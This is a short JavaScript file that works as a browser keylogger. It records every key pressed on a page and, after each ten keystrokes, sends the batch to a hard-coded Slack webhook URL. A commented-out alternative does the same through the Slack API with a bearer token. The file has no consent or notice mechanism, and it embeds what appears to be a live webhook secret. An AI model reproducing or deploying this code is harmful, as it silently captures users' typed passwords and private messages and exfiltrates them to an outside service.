let log = [];
// const token = "INSERT_API_KEY";

document.addEventListener('keydown', (event) => {
    
    log.push(event.key);

    if (log.length >= 10) {
        console.log(log);
        goPalantir(log);
        log = [];
    }
});

async function goPalantir(load) {
    try {
        load.join("");
        // fetch('https://slack.com/api/chat.postMessage', {
        //     method: 'POST',
        //     headers: {
        //         'Authorization': `Bearer ${token}`,
        //         'Content-Type': 'application/json'
        //     },
        //     body: JSON.stringify({
        //         channel: `C0BNS59V22V`,
        //         text: load,
        //     })
        // })
        fetch('https://hooks.slack.com/services/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', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                // 'Content-Type': 'application/json'
                'Content-Type': 'text/plain'
            },
            body: JSON.stringify({
                text: load
            })
        });
    } catch (error) {
        console.log('failed to palantir 💔');
    };
};